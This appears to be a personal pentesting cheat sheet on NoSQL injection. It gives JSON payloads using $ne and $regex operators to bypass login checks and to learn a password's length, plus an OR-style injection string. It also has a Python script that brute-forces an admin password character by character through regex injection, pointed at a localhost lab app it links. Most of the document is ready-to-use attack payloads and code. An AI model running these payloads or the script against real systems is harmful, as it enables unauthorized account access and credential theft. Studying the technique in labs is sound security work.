
There are other databases that don't use SQL queries, other databases use documents, key-value...

---
# When i can try this injection?

- If you test a lot of SQLi and doesn't work you can try this type of injection

---

# Injections

## If you don't know the password...

With burpsuite you can try to intercept the request and modify them to put this: 

Original:

````json
{
	"username":"admin",
	"password":"admin"
}
````

Modified:

````json
{
	"username":"admin","password":{
		"$ne":  "admin"
	}
}
````

You can add the conditional $ne (not equal)

## If you don't know the username...

````json
{
	"username": {
		"$ne":"pedro" 
	},
	"password":{
		"$ne":  "admin"
	}
}
````

## Using regex

You can indicate that the username begin with an "a", and the password is not equal to admin

````json
{
	"username":{
		"$regex": "^a"
	},
	"password":{
		"$ne":"admin"}
}
````

You can do the same with the password.

````json
{
	"username": "admin",
	"password":{
		"$regex":"^a"}
}
````

### ¿How I can know the length of the password?

You can use this:
````json
{
	"username": "admin",
	"password":{
		"$regex":".{24}"}
}
````

When the response is ok means **that is in the range of characters**

Remember you can bruteforce this with an script in python:

````python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... [!]")
    sys.exit(1)

# Ctrl_c
signal.signal(signal.SIGINT, def_handler)

# Global variables

login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24): # you can put a high limit and stop when don't take more characters
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeNoSQLI()
````

`from pwn import *` --> You can call the functions of pwn without call pwn, e.x --> error: pwn.foo(), correct: foo()

`import requests, time, sys, signal, string` --> requests, to do petition, time to waiting times, sys to exit from the program, signal to do ctrl_c and string to declare all the characters


## Or 1=1 in NoSQL

````json
admin'||'1'=='1'
````

---


# Tips

Sometimes you can try to change the method ( get --> post ) and change the Content-Type by: "application/json" and you can try to do here an injection  

---

# Labs

- [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

---

# Tags

#vulnerabilty  #nosql